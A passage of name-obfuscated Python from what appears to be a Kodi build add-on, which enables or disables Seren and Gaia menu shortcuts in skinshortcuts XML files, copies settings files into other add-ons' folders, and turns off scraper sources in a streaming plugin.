	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:595
    with open (OO0O0O000O00OOO0O ,'w')as OOO0OOO0OOOOOOO0O :#line:598
      OOO0OOO0OOOOOOO0O .write (O000000OOOOOOO0OO )#line:599
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:602
    with open (OO0O0O000O00OOO0O ,'r')as OOO0OOO0OOOOOOO0O :#line:603
      O000000OOOOOOO0OO =OOO0OOO0OOOOOOO0O .read ()#line:604
    O000000OOOOOOO0OO =O000000OOOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:622
    with open (OO0O0O000O00OOO0O ,'w')as OOO0OOO0OOOOOOO0O :#line:625
      OOO0OOO0OOOOOOO0O .write (O000000OOOOOOO0OO )#line:626
def rdbuildinstall ():#line:629
  try :#line:630
   O0OOOOOO0OOO000O0 =(ADDON .getSetting ("rdbuild"))#line:631
   if O0OOOOOO0OOO000O0 =='true':#line:632
     O00O000OO00OOOO0O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:633
     OO00OO0OOOO000O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:634
     copyfile (O00O000OO00OOOO0O ,OO00OO0OOOO000O00 )#line:635
  except :#line:636
     pass #line:637
def rdbuildaddonoff ():#line:640
    O0OOO00O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:643
    with open (O0OOO00O0O00O0O00 ,'r')as O000O0OOOO0O0O000 :#line:644
      O0O0O00000OOOOO00 =O000O0OOOO0O0O000 .read ()#line:645
    O0O0O00000OOOOO00 =O0O0O00000OOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:663
    with open (O0OOO00O0O00O0O00 ,'w')as O000O0OOOO0O0O000 :#line:666
      O000O0OOOO0O0O000 .write (O0O0O00000OOOOO00 )#line:667
    O0OOO00O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:671
    with open (O0OOO00O0O00O0O00 ,'r')as O000O0OOOO0O0O000 :#line:672
      O0O0O00000OOOOO00 =O000O0OOOO0O0O000 .read ()#line:673
    O0O0O00000OOOOO00 =O0O0O00000OOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:691
    with open (O0OOO00O0O00O0O00 ,'w')as O000O0OOOO0O0O000 :#line:694
      O000O0OOOO0O0O000 .write (O0O0O00000OOOOO00 )#line:695
    O0OOO00O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:699
    with open (O0OOO00O0O00O0O00 ,'r')as O000O0OOOO0O0O000 :#line:700
      O0O0O00000OOOOO00 =O000O0OOOO0O0O000 .read ()#line:701
    O0O0O00000OOOOO00 =O0O0O00000OOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:719
    with open (O0OOO00O0O00O0O00 ,'w')as O000O0OOOO0O0O000 :#line:722
      O000O0OOOO0O0O000 .write (O0O0O00000OOOOO00 )#line:723
    O0OOO00O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:727
    with open (O0OOO00O0O00O0O00 ,'r')as O000O0OOOO0O0O000 :#line:728
      O0O0O00000OOOOO00 =O000O0OOOO0O0O000 .read ()#line:729
    O0O0O00000OOOOO00 =O0O0O00000OOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:747
    with open (O0OOO00O0O00O0O00 ,'w')as O000O0OOOO0O0O000 :#line:750
      O000O0OOOO0O0O000 .write (O0O0O00000OOOOO00 )#line:751
    O0OOO00O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:754
    with open (O0OOO00O0O00O0O00 ,'r')as O000O0OOOO0O0O000 :#line:755
      O0O0O00000OOOOO00 =O000O0OOOO0O0O000 .read ()#line:756
    O0O0O00000OOOOO00 =O0O0O00000OOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:774
    with open (O0OOO00O0O00O0O00 ,'w')as O000O0OOOO0O0O000 :#line:777
      O000O0OOOO0O0O000 .write (O0O0O00000OOOOO00 )#line:778
    O0OOO00O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:780
    with open (O0OOO00O0O00O0O00 ,'r')as O000O0OOOO0O0O000 :#line:781
      O0O0O00000OOOOO00 =O000O0OOOO0O0O000 .read ()#line:782
    O0O0O00000OOOOO00 =O0O0O00000OOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:800
    with open (O0OOO00O0O00O0O00 ,'w')as O000O0OOOO0O0O000 :#line:803
      O000O0OOOO0O0O000 .write (O0O0O00000OOOOO00 )#line:804
    O0OOO00O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:806
    with open (O0OOO00O0O00O0O00 ,'r')as O000O0OOOO0O0O000 :#line:807
      O0O0O00000OOOOO00 =O000O0OOOO0O0O000 .read ()#line:808
    O0O0O00000OOOOO00 =O0O0O00000OOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:826
    with open (O0OOO00O0O00O0O00 ,'w')as O000O0OOOO0O0O000 :#line:829
      O000O0OOOO0O0O000 .write (O0O0O00000OOOOO00 )#line:830
    O0OOO00O0O00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:833
    with open (O0OOO00O0O00O0O00 ,'r')as O000O0OOOO0O0O000 :#line:834
      O0O0O00000OOOOO00 =O000O0OOOO0O0O000 .read ()#line:835
    O0O0O00000OOOOO00 =O0O0O00000OOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:853
    with open (O0OOO00O0O00O0O00 ,'w')as O000O0OOOO0O0O000 :#line:856
      O000O0OOOO0O0O000 .write (O0O0O00000OOOOO00 )#line:857
def rdbuildinstalloff ():#line:860
    try :#line:861
       O0O0OOO0O00O00OO0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:862
       OOO0OO0O0OO0OOO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:863
       copyfile (O0O0OOO0O00O00OO0 ,OOO0OO0O0OO0OOO0O )#line:865
       O0O0OOO0O00O00OO0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:867
       OOO0OO0O0OO0OOO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:868
       copyfile (O0O0OOO0O00O00OO0 ,OOO0OO0O0OO0OOO0O )#line:870
       O0O0OOO0O00O00OO0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:872
       OOO0OO0O0OO0OOO0O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:873
       copyfile (O0O0OOO0O00O00OO0 ,OOO0OO0O0OO0OOO0O )#line:875
       O0O0OOO0O00O00OO0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:878
       OOO0OO0O0OO0OOO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:879
       copyfile (O0O0OOO0O00O00OO0 ,OOO0OO0O0OO0OOO0O )#line:881
    except :#line:883
       pass #line:884
def rdbuildaddonON ():#line:891
    OOOO00O00O00O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:893
    with open (OOOO00O00O00O0OO0 ,'r')as OO000O0000OOO00OO :#line:894
      OOO0O00O000O0000O =OO000O0000OOO00OO .read ()#line:895
    OOO0O00O000O0000O =OOO0O00O000O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:913
    with open (OOOO00O00O00O0OO0 ,'w')as OO000O0000OOO00OO :#line:916
      OO000O0000OOO00OO .write (OOO0O00O000O0000O )#line:917
    OOOO00O00O00O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:921
    with open (OOOO00O00O00O0OO0 ,'r')as OO000O0000OOO00OO :#line:922
      OOO0O00O000O0000O =OO000O0000OOO00OO .read ()#line:923
    OOO0O00O000O0000O =OOO0O00O000O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:941
    with open (OOOO00O00O00O0OO0 ,'w')as OO000O0000OOO00OO :#line:944
      OO000O0000OOO00OO .write (OOO0O00O000O0000O )#line:945
    OOOO00O00O00O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:949
    with open (OOOO00O00O00O0OO0 ,'r')as OO000O0000OOO00OO :#line:950
      OOO0O00O000O0000O =OO000O0000OOO00OO .read ()#line:951
    OOO0O00O000O0000O =OOO0O00O000O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:969
    with open (OOOO00O00O00O0OO0 ,'w')as OO000O0000OOO00OO :#line:972
      OO000O0000OOO00OO .write (OOO0O00O000O0000O )#line:973
    OOOO00O00O00O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:977
    with open (OOOO00O00O00O0OO0 ,'r')as OO000O0000OOO00OO :#line:978
      OOO0O00O000O0000O =OO000O0000OOO00OO .read ()#line:979
    OOO0O00O000O0000O =OOO0O00O000O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:997
    with open (OOOO00O00O00O0OO0 ,'w')as OO000O0000OOO00OO :#line:1000
      OO000O0000OOO00OO .write (OOO0O00O000O0000O )#line:1001
    OOOO00O00O00O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1004
    with open (OOOO00O00O00O0OO0 ,'r')as OO000O0000OOO00OO :#line:1005
      OOO0O00O000O0000O =OO000O0000OOO00OO .read ()#line:1006
    OOO0O00O000O0000O =OOO0O00O000O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1024
    with open (OOOO00O00O00O0OO0 ,'w')as OO000O0000OOO00OO :#line:1027
      OO000O0000OOO00OO .write (OOO0O00O000O0000O )#line:1028
    OOOO00O00O00O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1030
    with open (OOOO00O00O00O0OO0 ,'r')as OO000O0000OOO00OO :#line:1031
      OOO0O00O000O0000O =OO000O0000OOO00OO .read ()#line:1032
    OOO0O00O000O0000O =OOO0O00O000O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1050
    with open (OOOO00O00O00O0OO0 ,'w')as OO000O0000OOO00OO :#line:1053
      OO000O0000OOO00OO .write (OOO0O00O000O0000O )#line:1054
    OOOO00O00O00O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1056
    with open (OOOO00O00O00O0OO0 ,'r')as OO000O0000OOO00OO :#line:1057
      OOO0O00O000O0000O =OO000O0000OOO00OO .read ()#line:1058
    OOO0O00O000O0000O =OOO0O00O000O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1076
    with open (OOOO00O00O00O0OO0 ,'w')as OO000O0000OOO00OO :#line:1079
      OO000O0000OOO00OO .write (OOO0O00O000O0000O )#line:1080
    OOOO00O00O00O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1083
    with open (OOOO00O00O00O0OO0 ,'r')as OO000O0000OOO00OO :#line:1084
      OOO0O00O000O0000O =OO000O0000OOO00OO .read ()#line:1085
    OOO0O00O000O0000O =OOO0O00O000O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1103
    with open (OOOO00O00O00O0OO0 ,'w')as OO000O0000OOO00OO :#line:1106
      OO000O0000OOO00OO .write (OOO0O00O000O0000O )#line:1107
def rdbuildinstallON ():#line:1110
    try :#line:1112
       OO00OOO00000OOOO0 =ADDONPATH +"/resources/rd/victory.xml"#line:1113
       OO00OO000OOO00O0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1114
       copyfile (OO00OOO00000OOOO0 ,OO00OO000OOO00O0O )#line:1116
       OO00OOO00000OOOO0 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1118
       OO00OO000OOO00O0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1119
       copyfile (OO00OOO00000OOOO0 ,OO00OO000OOO00O0O )#line:1121
       OO00OOO00000OOOO0 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1123
       OO00OO000OOO00O0O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1124
       copyfile (OO00OOO00000OOOO0 ,OO00OO000OOO00O0O )#line:1126
       OO00OOO00000OOOO0 =ADDONPATH +"/resources/rd/Splash.png"#line:1129
       OO00OO000OOO00O0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1130
       copyfile (OO00OOO00000OOOO0 ,OO00OO000OOO00O0O )#line:1132
    except :#line:1134
       pass #line:1135
def rdbuild ():#line:1145
	O0000O0O0OO00OO00 =(ADDON .getSetting ("rdbuild"))#line:1146
	if O0000O0O0OO00OO00 =='true':#line:1147
		OO0OOOOO0OOO0OOOO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1148
		OO0OOOOO0OOO0OOOO .setSetting ('all_t','0')#line:1149
		OO0OOOOO0OOO0OOOO .setSetting ('rd_menu_enable','false')#line:1150
		OO0OOOOO0OOO0OOOO .setSetting ('magnet_bay','false')#line:1151
		OO0OOOOO0OOO0OOOO .setSetting ('magnet_extra','false')#line:1152
		OO0OOOOO0OOO0OOOO .setSetting ('rd_only','false')#line:1153
		OO0OOOOO0OOO0OOOO .setSetting ('ftp','false')#line:1155
		OO0OOOOO0OOO0OOOO .setSetting ('fp','false')#line:1156
		OO0OOOOO0OOO0OOOO .setSetting ('filter_fp','false')#line:1157
		OO0OOOOO0OOO0OOOO .setSetting ('fp_size_en','false')#line:1158
		OO0OOOOO0OOO0OOOO .setSetting ('afdah','false')#line:1159
		OO0OOOOO0OOO0OOOO .setSetting ('ap2s','false')#line:1160
		OO0OOOOO0OOO0OOOO .setSetting ('cin','false')#line:1161
		OO0OOOOO0OOO0OOOO .setSetting ('clv','false')#line:1162
		OO0OOOOO0OOO0OOOO .setSetting ('cmv','false')#line:1163
		OO0OOOOO0OOO0OOOO .setSetting ('dl20','false')#line:1164
		OO0OOOOO0OOO0OOOO .setSetting ('esc','false')#line:1165
		OO0OOOOO0OOO0OOOO .setSetting ('extra','false')#line:1166
		OO0OOOOO0OOO0OOOO .setSetting ('film','false')#line:1167
		OO0OOOOO0OOO0OOOO .setSetting ('fre','false')#line:1168
		OO0OOOOO0OOO0OOOO .setSetting ('fxy','false')#line:1169
		OO0OOOOO0OOO0OOOO .setSetting ('genv','false')#line:1170
		OO0OOOOO0OOO0OOOO .setSetting ('getgo','false')#line:1171
		OO0OOOOO0OOO0OOOO .setSetting ('gold','false')#line:1172
		OO0OOOOO0OOO0OOOO .setSetting ('gona','false')#line:1173
		OO0OOOOO0OOO0OOOO .setSetting ('hdmm','false')#line:1174
		OO0OOOOO0OOO0OOOO .setSetting ('hdt','false')#line:1175
		OO0OOOOO0OOO0OOOO .setSetting ('icy','false')#line:1176
		OO0OOOOO0OOO0OOOO .setSetting ('ind','false')#line:1177
		OO0OOOOO0OOO0OOOO .setSetting ('iwi','false')#line:1178
		OO0OOOOO0OOO0OOOO .setSetting ('jen_free','false')#line:1179
		OO0OOOOO0OOO0OOOO .setSetting ('kiss','false')#line:1180
		OO0OOOOO0OOO0OOOO .setSetting ('lavin','false')#line:1181
		OO0OOOOO0OOO0OOOO .setSetting ('los','false')#line:1182
		OO0OOOOO0OOO0OOOO .setSetting ('m4u','false')#line:1183
		OO0OOOOO0OOO0OOOO .setSetting ('mesh','false')#line:1184
		OO0OOOOO0OOO0OOOO .setSetting ('mf','false')#line:1185
		OO0OOOOO0OOO0OOOO .setSetting ('mkvc','false')#line:1186
		OO0OOOOO0OOO0OOOO .setSetting ('mjy','false')#line:1187
		OO0OOOOO0OOO0OOOO .setSetting ('hdonline','false')#line:1188
		OO0OOOOO0OOO0OOOO .setSetting ('moviex','false')#line:1189
		OO0OOOOO0OOO0OOOO .setSetting ('mpr','false')#line:1190
		OO0OOOOO0OOO0OOOO .setSetting ('mvg','false')#line:1191
		OO0OOOOO0OOO0OOOO .setSetting ('mvl','false')#line:1192
		OO0OOOOO0OOO0OOOO .setSetting ('mvs','false')#line:1193
		OO0OOOOO0OOO0OOOO .setSetting ('myeg','false')#line:1194
		OO0OOOOO0OOO0OOOO .setSetting ('ninja','false')#line:1195
		OO0OOOOO0OOO0OOOO .setSetting ('odb','false')#line:1196
		OO0OOOOO0OOO0OOOO .setSetting ('ophd','false')#line:1197
		OO0OOOOO0OOO0OOOO .setSetting ('pks','false')#line:1198
		OO0OOOOO0OOO0OOOO .setSetting ('prf','false')#line:1199
		OO0OOOOO0OOO0OOOO .setSetting ('put18','false')#line:1200
		OO0OOOOO0OOO0OOOO .setSetting ('req','false')#line:1201
		OO0OOOOO0OOO0OOOO .setSetting ('rftv','false')#line:1202
		OO0OOOOO0OOO0OOOO .setSetting ('rltv','false')#line:1203
		OO0OOOOO0OOO0OOOO .setSetting ('sc','false')#line:1204
		OO0OOOOO0OOO0OOOO .setSetting ('seehd','false')#line:1205
		OO0OOOOO0OOO0OOOO .setSetting ('showbox','false')#line:1206
		OO0OOOOO0OOO0OOOO .setSetting ('shuid','false')#line:1207
		OO0OOOOO0OOO0OOOO .setSetting ('sil_gh','false')#line:1208
		OO0OOOOO0OOO0OOOO .setSetting ('spv','false')#line:1209
		OO0OOOOO0OOO0OOOO .setSetting ('subs','false')#line:1210
		OO0OOOOO0OOO0OOOO .setSetting ('tvs','false')#line:1211
		OO0OOOOO0OOO0OOOO .setSetting ('tw','false')#line:1212
		OO0OOOOO0OOO0OOOO .setSetting ('upto','false')#line:1213
		OO0OOOOO0OOO0OOOO .setSetting ('vel','false')#line:1214
		OO0OOOOO0OOO0OOOO .setSetting ('vex','false')#line:1215
